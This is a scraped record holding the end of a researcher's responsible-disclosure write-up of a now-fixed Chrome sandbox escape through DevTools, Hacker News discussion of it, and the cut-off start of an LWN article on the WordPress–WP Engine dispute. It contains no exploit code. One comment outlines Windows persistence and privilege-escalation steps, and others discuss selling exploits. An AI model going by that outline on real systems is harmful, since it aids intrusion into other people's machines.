trick the user into opening devtools, which triggers the chain leading to the sandbox escape. Google's Response After I reported the vulnerability, Google quickly confirmed it and classified it as P1/S1, which means high priority and high severity. Over the next few weeks, the following fixes were implemented: Adding a loaderId argument to the Page.reload command and checking the loaderID on the renderer side - This ensures that the command is only valid for a single origin and won't work if the command reaches a privileged page unintentionally. Checking for the URL in the inspectedWindow.reload() function - Now, this function isn't dependent on only the extension API revoking access. Checking if the test policies are enabled in the WebUI handler - By adding a working check in the handler function, this prevents the test policies from being set entirely. Eventually, the vulnerability involving the race condition was assigned CVE-2024-5836, with a CVSS severity score of 8.8 (High). The vulnerability involving crashing the inspected page was assigned CVE-2024-6778, also with a severity score of 8.8. Once everything was fixed and merged into the various release branches, the VRP panel reviewed the bug report and determined the reward. I received $20,000 for finding this vulnerability! Timeline April 16 - I discovered the test policies bug April 29 - I found the inspectedWindow.reload() bug involving the race condition May 1 - I sent the bug report to Google May 4 - Google classified it as P1/S1 May 5 - I found the bug involving crashing the inspected page, and updated my report May 6 - Google asked me to file separate bug reports for every part of the chain July 8 - The bug report is marked as fixed July 13 - The report is sent to the Chrome VRP panel to determine a reward July 17 - The VRP panel decided the reward amount to be $20,000 October 15 - The entire bug report became public Conclusion I guess the main takeaway from all of this is that if you look in the right places, the simplest mistakes can be compounded upon each other to result in a vulnerability with surprisingly high severity. You also can't trust that very old code will remain safe after many years, considering that the inspectedWindow.reload bug actually works as far back as Chrome v45. Additionally, it isn't a good idea to ship completely undocumented, incomplete, and insecure features to everyone, as was the case with the policy test page bug. Finally, when fixing a vulnerability, you should check to see if similar bugs are possible and try to fix those as well. You may find the original bug report here: crbug.com/338248595 I've also put the POCs for each part of the vulnerability in a Github repo. <- Back Copyright © 2024 ading2210. All rights reserved. The source code for this website can be found on my Github.",
    "commentLink": "https://news.ycombinator.com/item?id=41866802",
    "commentBody": "Escaping the Chrome Sandbox Through DevTools (ading.dev)346 points by vk6 12 hours agohidepastfavorite68 comments bschne 6 hours ago> You may have noticed that the page URL gets substituted into ${url}, and so to prevent this from messing up the command, we can simply put it behind a # which makes it a comment Is there some validation logic or something on this policy that the URL must be passed to the \"alternative browser\" somewhere in the AlternativeBrowserParameters? reply AlexDragusin 9 hours agoprevExcellent writeup and work, reading this made me be right there along with you in the excitement buildup thoughout the discoveries. Thank you! Well deserved reward! reply forkerenok 11 hours agoprevThat's a neat vulnerability chain and a great writeup. Appreciated the breakdown of the vulnerable code as well! I'm always impressed by the simplicity of tricks like \"Press F12 to try again\", this is just so naughty :) reply lenerdenator 5 hours agoparentI live in Missouri; I pressed F12 once and the governor tried to get me arrested. reply Glant 1 hour agorootparentFor those not in the know: https://techcrunch.com/2021/10/15/f12-isnt-hacking-missouri-... reply noduerme 8 hours agoprevOof. Too late in my night to dive into the guts of what's broken in WebUI validation, but good on this person for persisting and figuring it out. It's pretty standard to question and distrust toolchains in the things we deploy, but at the same time we put way too much trust in magically convenient dev tools from large companies like Google or MS. Mostly because we want to get on with writing and testing our own code, not worry about whatever the fuck is lurking in Chromium or VSCode. reply purple-leafy 10 hours agoprevGod damn that is one of the best things I’ve ever read. Super clever sleuthing reply rs_rs_rs_rs_rs 8 hours agoprev>I'm Allen, a high school student with an interest in programming, web development, and cybersecurity. Very impressive! reply albert_e 4 hours agoparentOh boy What an amazing technical talent, sheer persistence, and excellent documentation and communication skills. Not to mention the work ethic of responsible disclosure. This person is going places! reply est 9 hours agoprevChromium project decides to remove chrome://net-internals because the page is too complex ... and adding chrome://policy with half baked JSON edit support. reply EDEdDNEdDYFaN 10 hours agoprevreally sick writeup, felt like a thriller novel reply throwawayian 10 hours agoprevAwesome vuln chain. reply igtztorrero 5 hours agoprevWow, wow and wow for a High school student. reply bossyTeacher 7 hours agoprevIs it bad for Chrome to have vulnerabilities? I think long-term is really good. People need to get away from the browser monopoly (because it really is only Chrome here holding the power) and support the ecosystem reply diggan 5 hours agoparent> Is it bad for Chrome to have vulnerabilities? Yes, obviously it is. Is it bad for others/the public? Probably, but not as bad as it is for Chrome. > because it really is only Chrome here holding the power I'm not sure this is true. Apple pretty much forces usage of their browser engine on iOS, and heavily try to get people to use Safari on macOS. Windows push Edge pretty hard on their OS, and their browser engine is pretty much intertwined to the OS so you can't not use it. Both of them say they let you change the default, but various links in the OS would still open Edge/Safari even if you have the default browser changed. Not sure if that's on purpose or not. reply Etheryte 11 hours agoprev [–] Given the severity, I can't help but feel that this is underpaid at the scale Google is at. Chrome is so ubiquitous and vulnerabilities like these could hit hard. Last thing they need to do is to send the signal that it's better to sell these on the black market. reply thrdbndndn 10 hours agoparentI hate that every time a vulnerability is posted, someone has to argue about whether the bounty is high enough. It’s always followed by, \"blah blah, they're pushing whitehats to sell it on the black market.\" Vulnerabilities will always sell for more on the black market because there’s an added cost for asking people to do immoral and likely illegal things. Comparing the two is meaningless. To give a straightforward answer: no, I don’t think $20k is underpaid. The severity of a bug isn't based on how it could theoretically affect people but on how it actually does. There's no evidence this is even in the wild, and based on the description, it seems complicated to exploit for attacks. reply n2d4 10 hours agorootparent> The severity of a bug isn't based on how it could theoretically affect people but on how it actually does No, it's priced on demand and supply like anything else; bug bounties are priced to be the amount that Google thinks it takes to incentivise hunters to sell it to them, vs. to black hats. reply luismedel 10 hours agorootparentI know not everyone shares my world-view, but I need to be literally starving to consider selling whatever I discover to a criminal. principles > wild market reply cookiengineer 9 hours agorootparent> principles > wild market Your principles will be gone by the time the 10th company starts to sue you for a public disclosure you did in good faith. There's a reason why nobody wants to use their real name and creates new aliases for every single CVE and report. Principles are discrepancies with the law, they don't exist. If the law dictates a different principle than your own one, guess what, you'll be the one that is in jail. Whistleblower protection laws are a bad joke, and politicians have no (financial) incentives to change that. reply Arnt 7 hours agorootparentprevNot going to name names, but someone I know was happy when his workplace was acquired by a bigger company from another country. He was the most senior developer, had done the heavy lifting, the product was did a good job for its happy users and the buyer would continue that, and last but not least, he'd be rich. Admittedly part of the agreement was a handshake, there had been so much to do, they'd worked insane amounts of overtime and some paperwork had been deferred… He got nothing. No money at all. The CEO pretended to have forgotten every verbal agreement. You only need to experience that kind of thing once to change your mind. reply kevindamm 6 hours agorootparentTo change your mind about making sure everything is in writing in a binding contract? reply Arnt 6 hours agorootparentI'd guess most people would react in one of three ways, including that one. I can understand all three. reply graemep 10 hours agorootparentprevI think many people have internalised a purely profit driven world view, and it is what they expect to be the main motivator or themselves and others. reply TeMPOraL 9 hours agorootparentTL;DR: a random stranger is most likely a nice and honest and principled human being. A sufficiently large population of random strangers behaves approximately like a population of amoral(ish), rational(ish) economic actors. If your process involves continuously drawing a stranger at random from a population, then you can't avoid taking the economic view, because you eventually will draw a crazy or malevolent or economically-rational stranger. -- GP wouldn't sell their discoveries to the criminals. But would they consider selling them to a third party as an intermediary, perhaps one that looks very much above board, and specializes in getting rewards from bug bounties in exchange for a percentage of payout? I don't know if such companies exist, but I suspect they might - they exist for approximately everything else, it's a natural consequence of specialization and free markets. Say GP would say yes; how much work would they put into vetting the third party doesn't double-dip selling the exploit on the black market? How can they be sure? Maybe there is a principled company out there, but we all know principled actors self-select out of the market over time. Or, maybe GP wouldn't sell them unless starving, but what if agents of their government come and politely ask them to share, for the Good of their Country/People/Flag/Queen/Uniform/whatever? Or, maybe GP wouldn't sell them unless starving, but what is their threshold of \"starving\"? For many, that wouldn't be literally starving, but some point on a spectrum between that and moderate quality-of-life drop. Like, idk, potentially losing their home, or (more US-specific I guess) random event leaving them with a stupidly high medical bill to pay, etc. With all that in mind, the main question is: how do you know? How does Google know? The reason people take an economic view of the world is because it's the only tool that lets you do useful analysis - but unlike with the proverbial hammer that makes everything look like a nail, at large enough scale, approximately everything behaves like a nail. Plus, most of the time, it only takes one. GP may be principled, but there's likely[0] more than one person making the same discovery at the same time, and some of those people may not be as principled as GP. You can't rely on only ever dealing with principled people - like with a game of Russian roulette, if you pull the trigger enough times, you'll have a bad day. -- [0] - Arguably, always. Real breakthrough leaps almost never happen, discoveries are usually very incremental - when all the pieces are there, many people end up noticing it and working on the next increment in parallel. The first one to publish is usually the only one to get the credit, though. reply n2d4 10 hours agorootparentprevBut you probably wouldn't take the time to write up a nice report and send it to Google either if they didn't pay. Or even try to find the bug in the first place. (But yea, I think lots of people would sell exploits to criminals for enough money.) reply worble 8 hours agorootparentYeah I think this is the part that never gets mentioned. I'd like to think that most people wouldn't immediately go to selling on the black market, even if the pay is better it's just too risky if you get caught. But if you don't pay people enough in the first place... then they're just going to spend their time doing other things that actually do pay and your bugs won't get caught except by those who are specifically trying to target you for illicit purposes. reply ndheebebe 8 hours agorootparentprevNot worth it. Because now you are in the underbelly. reply tomjen3 9 hours agorootparentprevI mean the alternative isn’t that you are selling it on the black market, it’s that you expose the issue in a blog post and the first time google knows is because one of their employees see the post here on hacker news. You are essentially been paid to fill out forms and keep your mouth shut. reply throwaway48476 7 hours agorootparentprevThis assumes efficient markets which doesn't exist when there is a monopoly on legitimate buyers. The value any one individual puts on a thing does not a market make. reply swexbe 7 hours agorootparentIs it really a amonopoly though if there are multiple companies offering bug bounties? If the whitehat feels he is underpaid he could just go look for bugs for another product. reply throwaway48476 7 hours agorootparentThe market or lack thereof is for a product. That researchers can work on a different product is a market for labor. reply magic_hamster 5 hours agorootparentprevThere's a clear cut between selling it to Google and selling it to black hats. White hats mostly have a career in cyber security and they will not disclose a vulnerability to a compromised party regardless of the price. Cyber security researchers will like having their name attached to a CVE or a fix in a well known open source project which is arguably worth more than 20K to them. If someone finds out you sold a vulnerability, or exploit, to a hostile party, your career is over. reply skriticos2 7 hours agorootparentprevYea, legitimate with illegitimate is a weird kind of calculation, as the risk with illegitimate market is to end up in jail, and few people want to calculate the monetary value of lost time due to incareration and all the fallout that comes with it. The more interesting question would be, if the bug bounty is enough to keep legitimate researchers engaged to investigate and document the threats. But.. The bug bounty itself is only a drop in the bucket for security companies, as it's a, unsteady and b, not enough to cover even trivial research environment cost. Pratcially it's a nice monetary and reputation bonus (for having the name associated with the detection) in addition to the regular bussiness of providing baseline security intelligence, solutions and services to enterprises, which is what earns the regular paycheck. Living from quests and bonties is more the realm of fantasy. reply ballenf 6 hours agorootparentIs it actually illegal to sell an exploit to the highest bidder? Obviously deploying or using the exploit violates any number of laws. From a speech perspective, if I discovered an exploit and wrote a paper explaining it, what law prevents me from selling that research? reply kevindamm 6 hours agorootparent(I'm not a lawyer but) I think that would involve you in the conspiracy to commit the cybercrime, if you developed the exploit and sold it to an entity that used it with wrongful intent. https://www.law.cornell.edu/uscode/text/18/1029 gives the definition and penalties for committing fraud and/or unauthorized access, and it includes the development of such tools. A lot of it includes the phrasing \"with intent to defraud\" so it may depend on whether the court can show you knew your highest bidder was going to use it in this way. (apologies for citing US-centric law, I figured it was most relevant to the current discussion but things may vary by jurisdiction, though probably not by much) reply z3phyr 6 hours agorootparentprevYou only risk prison if you sell it to the \"bad guys\" on the black market. Sell it to people who can jail the bad guys instead; that is, our governments. reply thrdbndndn 10 hours agorootparentprevI actually don't believe so. Not everything is priced on demand and supply -- at least not strictly. Of course the potential of abuse is part of the equation, but I think Google (or similar large companies) simply has a guideline of how the amount of the bounty is decided, than surveying the market to see what its \"actual value\" is. It's not exactly a free market, at least not on Google's side. reply n2d4 10 hours agorootparentI assure you that when Google set those bounties, they thought about how much they would have to pay white hats to make them do the right thing. Of course, it's a highly illiquid market (usually there's just one seller and only a handful of buyers), and so the pricing is super inefficient (hence based on guidelines and not surveying on every individual bug), but the logic remains. reply wslh 9 hours agorootparentprev> it's priced on demand and supply like anything else You should complete the sentence: “It’s priced based on demand and supply in legal markets like anything else.” There are, of course, other markets where things like this are traded, but that’s a different story. That said, I think the author is free to negotiate further with Google if they believe it’s worth it. reply 7thpower 9 hours agorootparentprevI suspect the fact there is potentially a wider addressable market via the black market probably has more to do with the price setting mechanism than an immorality premium. Although, maybe there is something to the immorality/illegality tax in this case. The author is in high school (how cool is that!?) and the article would probably hit differently to perspective employers if they were detailing the exploit they had sold to NK (which is to say nothing of how NK would feel about the sunlight). reply edent 8 hours agoparentprev> sell these on the black market. How? I always see this mentioned but it seem impractical to me. I've discovered bugs which have paid out a few thousand dollars - big corporates have well publicised schemes, but I've no idea how I would go about selling it to a criminal. Even if I did know where to find them - how would I trust them? Can I tell they're not really the police doing a sting? If they paid me, how would I explain my new wealth to the tax authorities? Once the criminal knows they've paid me, what's to stop them blackmailing me? Or otherwise threatening me? Oh, and I won't be able to publish a kudos-raising blog post about it. How much would a criminal have to pay me to take on that level of risk? Should Google pay out more for this? Probably. Is the average security researcher really going to take the risk of dealing with criminals in the hope that they pay a bit more? Unlikely. reply spyder 7 hours agorootparent> How? Huh... First result in google for \"selling exploits\" shows it's not only criminals who are buying exploits: https://zerodium.com/program.html (up to $500K for Chrome RCE, but probably not for this since requires extension install) Another result is the Wikipedia article, which also talks about these gray markets: \"Gray markets buyers include clients from the private sector, governments and brokers who resell vulnerabilities.\" reply z3phyr 6 hours agorootparentprevSell it to governments. Biggest good guys bad guys. reply scotty79 7 hours agorootparentprevI think maintaining anonimity is the key. Ensuring getting paid is the next thing. I'm not sure how you can achieve this in practice. reply TheDong 10 hours agoparentprevIf you can trick someone into installing a malicious extension with arbitrary permissions, you can already run arbitrary code on every webpage they visit, including their logged in bank, social media, etc. You think an attacker is right now thinking \"Man, I know exactly how to make a lot of victims install an extension, but I can only steal their coinbase wallet and bank accounts, if only there was a way I could run calc.exe on their machine too...\" who's going to pay more than $20k to upgrade from \"steal all their money\" to \"steal all their money and run calc.exe\"? reply TeMPOraL 8 hours agorootparentNo, \"calc.exe upgrade\" is definitely worth more than $20k to criminals, as it's a huge qualitative jump in capabilities. A full-privileged browser extension can only mess with things you actively visit in your browser. But give it \"calc.exe privileges\", and it now can mess with anything that touches your computer, with or without your involvement. Private keys on your hard drive, photos on your phone that you plugged in via USB to transfer something, IoT devices on your LAN - all are fair game. And so many, many other things. reply webXL 9 hours agorootparentprevCorrect me if I’m wrong, but remote code execution has the advantage of being able to access information without the user being involved at all. Sure the user needs to install and trigger the exploit, but whatever code the attacker runs doesn’t require the user to interact with certain urls. If you can launch arbitrary programs, you can probably install all sorts of nasty things that are potentially more lucrative than the victim’s bank or coinbase accounts. reply therein 9 hours agorootparentIt breaks the assumption that Chrome is sandboxed and something I do as a user including installing an extension will not have an impact outside of Chrome. A new process outside Chrome to call your own and do whatever you want with. You're on Windows? Download a binary, create some WMI triggers and get executed at every boot as the same user (requires no elevation for same user, if Admin, you can get NT_AUTHORITY). If you find something to elevate to Administrator you could also patch the beginning of some rarely used syscall and then invoke it and get a thread to yourself in the kernel. These things tend to almost chain themselves sometimes. At least on Windows it feels that way. Also the user doesn't have to navigate to a specific URL in the final form, just needs to open devtools after installing the extension. reply beng-nl 9 hours agorootparentprevI actually think escaping the browser is a huge leap and a frequently a primary goal for a black hat. Eg someone trying to install ransomware, or a spy targeting a specific person or org. From outside the browser they can exploit kernel bugs to elevate their privilege; and they can probe the network to attempt to move laterally in the org. So while I think your comment is thoughtful, its thoughtfulness made me think of agreeing with the opposite :-) reply grokkedit 10 hours agorootparentprevthat's not entirely true: if you look at the manifest on the github repo you can see that it only requires the `tab` permission, which, when installed, will make the extension seem quite safe, since it should not have access to the content of your pages reply scotty79 7 hours agorootparentprevRun calc.exe actually means steal money of everybody in their entire organization or blackmail the entire organization by encypting all the data they need to function. reply echoangle 4 hours agorootparentIf compromising a single machine of a user already compromises your entire orgs IT, you’re doing something wrong, right? Shouldn’t a normal user lack privileges to do this much damage to the network? reply billy99k 6 hours agoparentprevI've made lots of money with bug bounties over the years and mostly stopped this year in favor of private consulting. Companies will try anything to get out of paying, even through the major platforms. I once found a bug where I could access all of the names, addresses, emails, and phone numbers of all users for this new contest this company was running. I even found public announcements on Twitter. They told me this was a staging environment and wouldn't pay me. It clearly wasn't as the urls were linked directly to the announcement. Another time, a company had an application that allowed other companies to run internal corporate training. I was able to get access to all accounts, information, and private rooms of all fortune 500 companies using it. They initially tried to get out of it by telling me they didn't own the application anymore (and immediately removed it from scope). I had proof it was in scope at the time I found the bugs (and even confirmed it before-hand with the platform). Luckily, the platform I went through fought this and I got my payout...6 months later. Even now, I have 50+ bugs that were triaged over the past year and the companies just sit on them and won't respond or pay out. Major platforms like Hackerone and Bug crowd don't seem to protect their researchers at all. reply alt227 6 hours agorootparentIf they make excuses, sit on it, or dont pay out, release those bugs into the public domain, thats how this system works! reply billy99k 2 hours agorootparentWhile I would love to do that, I still enjoy making a living in security. reply grokkedit 10 hours agoparentprevthey say: `This also means that, unfortunately, the bug will not work on stable builds of Google Chrome since the release channel is set to the proper value there` So it's only working on Chromium, a way smaller attack surface than the whole Chrome users reply Thorrez 6 hours agorootparentSlight correction: it worked on Chromium and on Google Chrome canary. reply londons_explore 9 hours agoparentprev\"what percentage of grandmas would lose their life savings if they stumble across this bug\" is the metric I use to determine severity. And in this case, it requires a chain of unlikely events. The user tricked into installing an extension (probably not one from the store, which is now particularly hard on windows). The user tricked into opening devtools. It's gonna be sub-1%. Certainly still worth fixing, but nowhere near as bad as a universal XSS bug. reply gardenmud 6 hours agorootparentNot only that, but it doesn't work on Google Chrome releases, only the (upstream) Chromium, and Google Chrome canary. Very few people use raw Chromium all by its lonesome and I would guess only for testing/development, not downloading random extensions. reply TRiG_Ireland 3 hours agorootparentI use Chromium, because I'm on Ubuntu. (Admittedly, I don't use it very often. I tend to be loyal to Firefox most of the time.) reply alkonaut 10 hours agoparentprevIf it had worked for Chrome it should (and maybe would) have been a lot higher. Also: doesn't it use an extension? I was under the impression that extensions were un-sandboxed and basically just executables I trust to run with the same privilege as the browser itself (which is a lot, at least under windows). reply Etheryte 9 hours agorootparentNo, extensions are tied to the browser sandbox and they also have to specify their permissions beforehand. They can request fairly wide permissions inside the browser sandbox, yes, but they have to explicitly list the permissions they require in the manifest and the browser will ask you if you're fine with those before installing. Outside of the browser itself, the extensions can't do pretty much anything outside of sending messages to applications that explicitly register to receive them from them. reply faangguyindia 7 hours agoparentprev [–] Chrome needs to be rewritten in Rust asap reply gsck 5 hours agorootparentNo it doesn't? This has nothing to do with memory safety. Its a logical error, which Rust physically cannot prevent. reply z3phyr 6 hours agorootparentprevMalwares are going to be written in rust; What difference does it make? Also Its not memory based vulnerability but policy based vulnerability. reply echoangle 4 hours agorootparentBut at least the vulnerability would be blazingly fast reply j0hnyl 2 hours agorootparentprev [–] Did you even read the post? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Two vulnerabilities, CVE-2024-6778 and CVE-2024-5836, were discovered in the Chromium web browser, allowing a sandbox escape from a browser extension and enabling execution of shell commands on a user's PC.",
      "The vulnerabilities were found in Chromium's WebUI and enterprise policy systems, involving manipulation of the chrome://policy page and the Browser Switcher feature, as well as bypassing restrictions using the chrome.devtools.inspectedWindow API.",
      "Google classified these vulnerabilities as high severity, rewarded the researcher $20,000, and implemented fixes, emphasizing the need for thorough security checks of old code and undocumented features."
    ],
    "commentSummary": [
      "A high school student identified a vulnerability in Chrome's DevTools, enabling escape from the browser's sandbox, which is a security mechanism to isolate web content.",
      "The exploit requires user interaction, such as installing an extension and opening DevTools, and affects only Chromium and Chrome Canary, not the stable Chrome versions.",
      "The incident sparks debate on bug bounty programs, with some advocating for higher payouts to deter selling exploits on the black market, while others emphasize the ethical risks of selling to criminals."
    ],
    "points": 346,
    "commentCount": 68,
    "retryCount": 0,
    "time": 1729144504
  },
  {
    "id": 41866328,
    "title": "WordPress retaliation impacts community",
    "originLink": "https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/",
    "originBody": "LWN .net News from the source Content Weekly Edition Archives Search Kernel Security Events calendar Unread comments LWN FAQ Write for us Edition Return to the Front page User: Password:| Subscribe / Log in / New account WordPress retaliation impacts community [LWN subscriber-only content] Welcome to LWN.net The following subscription-only content has been made available to you by an LWN subscriber. Thousands of subscribers depend on LWN for the best news from the Linux and free software communities. If you enjoy this article, please consider subscribing to LWN. Thank you for visiting LWN.net! By Joe Brockmeier October 14, 2024 It is too early to say what the outcome will be in the ongoing fight between Automattic and WP Engine, but the WordPress community at large is already the loser. Automattic founder and CEO Matt Mullenweg has been using his control of the project, and the WordPress.org infrastructure, to punish WP Engine and remove some dissenting contributors from discussion channels. Most recently, Mullenweg has instituted a hostile fork of a WP Engine plugin and the forked plugin is replacing the original via WordPress updates. In the beginning of the Automattic and WP Engine spat, many people hoped that the companies would ratchet down the hostilities—or at least leave it to lawyers to sort out while leaving the larger community out of it. Those hopes have gone unrealized. WP Engine did try to opt for the legal-only route. The day after the \"reprieve\" on the WordPress.org ban ended, October 2, WP Engine filed a 62‑page complaint against Automattic and Mullenweg personally, and asked for a jury trial. The suit's claims include contractual interference, computer fraud (for blocking its access to WordPress.org), attempted extortion, libel, and slander. In addition, the suit asks for declaratory judgment that WP Engine is not infringing on or diluting the WordPress, WooCommerce, and other trademarks that Automattic named in its cease‑and‑desist letter. That is, of course, a move that was unlikely to rebuild any burned bridges between Automattic and WP Engine. It was predictable that the WordPress.org ban would remain in place, that Automattic would respond to the suit, and perhaps countersue WP Engine. However, to date, there has been no indication of a countersuit or response to WP Engine's lawsuit. Instead, Mullenweg is using other means to cause problems for WP Engine—and those tactics have spilled over to the wider WordPress community in troubling ways. The checkbox Participating in the development of WordPress is not realistically possible without logging into the site. Using WordPress.org is mandatory for those who would like to contribute and update plugins, access the WordPress Trac (bug tracker) instance, and more. On October 9, a new checkbox was added to the account login form on WordPress.org which reads \"I am not affiliated with WP Engine in any way, financially or otherwise.\" If the box is left unchecked, users will get a prompt to check the box if they wish to proceed. Naturally, many contributors had questions about this new checkbox, since its wording is ambiguous and any possible consequences are murky. It seems clear it would apply to those employed by WP Engine, but just how far does \"financially and otherwise\" go? Does this apply, for example, to employees of the many companies that host their clients' web sites on WP Engine? Customers with a subscription to one of WP Engine's services? A number of contributors have sought answers about this policy in the WordPress Slack, with disappointing results. A handful have reported being banned from the Slack instance after these conversations, either due to pressing for answers or questioning Mullenweg's leadership. Javier Casares shared that his account was deactivated after he asked a series of questions in a Slack thread started by Colin Stewart. (Note that one needs to have a WordPress.org account, and be signed in, to request an account on the WordPress Slack.) In the thread, Mullenweg said that the value of the checkbox is not stored, but refused to clarify what qualifies as an affiliation with WP Engine. He advised those who had questions to \"consult a lawyer\". Casares said that most people agree that WP Engine should contribute more to WordPress, but that using WordPress.org as part of the battle is counterproductive. He asked on Slack that the language be changed to indicate a user does not work for WP Engine, but that suggestion was not taken up. Pick a side Another participant, Terence Eden, asked on Slack whether he could send pull requests via GitHub if he was affiliated with WP Engine. After an exchange with Mullenweg that was less than helpful, Eden replied: I've never seen anyone spread so much FUD about their own project before. I started out as sympathetic to your cause against WP Engine. But your behaviour has driven me - and many other good people - away. He later reported on Mastodon that his account was deactivated. Andrew Hutchings, a contributor who works on WordPress as part of his work with the MariaDB Foundation, participated in the conversation as well. He wondered on Slack how many individual contributors could afford a lawyer to advise about the checkbox and added \"I work for a different Foundation, one that definitely cannot afford a lawyer for me to contribute.\" He wrote on his blog about being banned and said that he just wanted to work on the project: I think I speak for many in the WordPress community / ecosystem when I say that we don't want to take sides in this battle. We don't want to be forced to take sides via a checkbox. We just want to get work done, to improve WordPress for everyone. That may not be an option. During the checkbox discussion in the #meta Slack channel Alex Sirota said: \"Do you not understand what is happening here? It's pretty simple in my opinion: you have to take a side.\" Stewart said that if that was the intention, then Mullenweg could say so himself. Shortly after, Mullenweg said, \"I want you all to be informed and involved. Not to stay on the sidelines.\" Sirota's account has also been deactivated now, though it is not clear whether he was banned or deactivated the account himself. Mullenweg had also asked Automattic employees to pick a side, shortly after banning WP Engine from WordPress.org. He wrote on October 3 that Automattic had extended an \"Alignment Offer\" to its employees. The company provided a buyout package of $30,000 or six months of salary (whichever was higher) to employees who wanted to leave because they disagreed with Mullenweg's actions. Employees who accepted the buyout were immediately terminated and are not eligible for rehire. According to the post, 159 people⁠—⁠8.4% of the company⁠—⁠accepted the offer. Advanced Custom Fields WordPress's popularity has a lot to do with its plugins and themes. A vanilla WordPress installation is missing a lot of features that one might want or need to run a web site: backups, commerce features, statistics, contact forms, search-engine optimization (SEO), managing URL redirects, or adding additional content types to WordPress. A large ecosystem has sprung up around WordPress to offer services via those plugins, paid versions of plugins with additional functionality, and paid themes to simplify site design. In turn, that helps solidify WordPress's place as the most popular content-management system (CMS) on the web. WP Engine produces popular plugin called Advanced Custom Fields (ACF), which has more than two million installs through WordPress.org. It allows developers to add extra content fields (called custom fields) to WordPress's edit screens. This might be used, for example, as part of adding a date picker or an interface to create photo galleries for a site. ACF is, in turn, used by or in conjunction with a large number of other WordPress plugins such as Advanced Forms for ACF and WPML for translating WordPress sites. The base ACF plugin is free, but it also has a paid version (\"ACF Pro\") with a yearly subscription. Both are available under the GPLv2, but users must pay for access to updates on the Pro version and those come directly from WP Engine. On September 28, Mullenweg asked on Slack whether ACF Pro should be included in WordPress core, the components and functionality included in a default install of WordPress. That drew mixed responses in the channel. Some users noted that the ability to add custom fields was long overdue, but others had qualms about taking over ACF Pro \"out of spite\". Richard Korthuis asked what kind of message it would send to other developers who create paid plugins: \"No matter what you think about WP Engine and the whole dispute, this [sends] developers the wrong message and would prevent future investments in new plugins\". In a now-deleted Tweet, Automattic announced on October 5, a Saturday, that it had \"responsibly disclosed a vulnerability\" in ACF to WP Engine. The company did not provide further details. John Blackbourn, the WordPress core security team lead, said that Automattic had breached the Intigriti Code of Conduct by \"irresponsibly announcing\" the vulnerability publicly. Intigriti is a company that runs bug-bounty programs for companies, including WP Engine. On October 7, WP Engine announced a security release of the plugin. The vulnerability itself seems to be minor, according to the release notes. It is not a flaw that can be exploited remotely and it only impacts \"the unlikely scenario\" where a user with administrative privileges tries to attack other administrative users, or tries to gain super-admin privileges on a multi-site installation of WordPress. So far few other details on the vulnerability beyond that have been provided. Another XZ backdoor it is not. Because its developers are now blocked from WordPress.org, WP Engine had to provide its fix to the WordPress Security team to have it uploaded to the plugin directory. There are also instructions on updating the plugin manually to receive updates directly from WP Engine. ACF fork Mullenweg made an announcement on October 12, another Saturday, \"on behalf of the WordPress security team\" that ACF was being forked as Secure Custom Fields (SCF) under point 18 of the plugin directory guidelines. That part of the guidelines states, in part, that WordPress.org may \"remove developer access to a plugin in lieu of a new, active, developer\" and \"make changes to a plugin, without developer consent, in the interest of public safety\". According to the post this move was \"a rare and unusual situation brought on by WP Engine's legal attacks\". Automattic has not merely forked the ACF code and made it available under a new name to compete with WP Engine. That might raise a few eyebrows, but it would probably be considered fair game by most observers. Instead, it has forked the code and taken over the plugin's entry, including all of its reviews, in the WordPress.org catalog. The new plugin is being substituted in place of ACF for all of the users who have installed it previously. According to the announcement on WordPress.org, sites that auto-update plugins will receive the SCF plugin automatically. Some site owners may be unaware that the plugin has been silently replaced. According to a comment by Mullenweg on Hacker News on October 14, there have already been 225k downloads of the new plugin, and he estimated \"at least 60% of the sites with auto-upgrade on and using .org for updates\" have been moved to the fork. This is not the first time a company has taken control of a package distributed through a central repository, though it is rare. The left-pad incident in 2016, for example, saw npm, Inc. restore left-pad to the Node.js package repository after its developer, Azer Koçulu, removed it. That move, however, was intended to reduce disruption to the Node.js ecosystem: the removal had broken builds for thousands of projects that had included the package, and Koçulu had effectively abandoned it. The takeover of ACF's place in the WordPress directory, on the other hand, is a punitive move by Automattic against another company that reaches beyond WordPress.org's infrastructure into millions of WordPress installs. Web developer Charles Fulton wrote about the incident and said that this is \"a profoundly destabilizing action for the WordPress plugin ecosystem\"; he wondered if he needed to worry about updates to core WordPress that might interfere with ACF Pro. WPGraphQL brought into the fold Users of ACF Pro that depend on the WPGraphQL and WPGraphQL for Advanced Custom Fields plugins may have real cause to be concerned that Automattic will look to break compatibility for ACF. WPGraphQL provides a GraphQL schema and API for WordPress sites and is a popular plugin to use in conjunction with ACF. Jason Bahl, the maintainer of the plugin, announced on October 7 that he was leaving WP Engine to join Automattic. Additionally, he said that WPGraphQL is becoming a \"canonical plugin\" for WordPress. The concept of canonical plugins is loosely defined, but Mullenweg described them in 2022 as official plugins that are the first choice for a type of functionality, but too niche to be included in the core distribution. With WPGraphQL development under Automattic's roof, it seems unlikely that compatibility with ACF will be a priority. Scott Kingsley Clark, who has been involved in a project to bring a fields API into the WordPress core, announced on October 13 that he was stepping down from contributing to WordPress core. The fields API project on GitHub has been archived with a goodbye notice that states that it pains him to stop but that he is \"done making excuses for Matt's actions and will not associate myself with core any longer\". He added on Mastodon.social that he was going to remain part of the WordPress community overall, and continue working on the Pods plugin. What next? What happens next, what Mullenweg will do next, is anyone's guess. Mullenweg's vendetta against WP Engine has spilled over into the community in a way that can't easily be ignored or avoided. His leadership of the project is being repeatedly called into question by contributors, users, and outside observers. That will spill over, if it hasn't already, into the wider commercial ecosystem and have serious consequences for plugin creators, creative agencies, and hosting providers who have invested a lot into WordPress. More contributors are likely to step away, whether they do so publicly or simply drift away and find other things to do with their time. Quite a few users on social networks have commented that they would no longer recommend WordPress and are looking for alternatives. A fork, in addition to ClassicPress, seems almost inevitable. There is a legitimate conversation to be had, or continued, about the commercialization of open-source projects by companies that do little to sustain open-source software but reap its benefits and pull revenue away from the companies that do put in the work. That conversation has been completely eclipsed by Mullenweg's actions to punish WP Engine. Mullenweg the \"mad king\" Armin Ronacher, creator of the Flask web framework for Python and participant in launching the Open Source Pledge, has some interesting thoughts on the topic of mixing money and open source in light of the ongoing WordPress crisis: Is it a wise [idea] to mix Open Source and money? Maybe not. Yet I also believe it's something that is just a reality we need to navigate. Today there are some projects too small to get any funding (xz) and there are projects large enough to find some way to sustain by funneling money to it (Rails, WordPress). He observes that he has seen too many people in open source struggle \"one way or another\" as a direct or indirect result of work in open source. He says Mullenweg, like other creators of open-source projects, feels wronged by 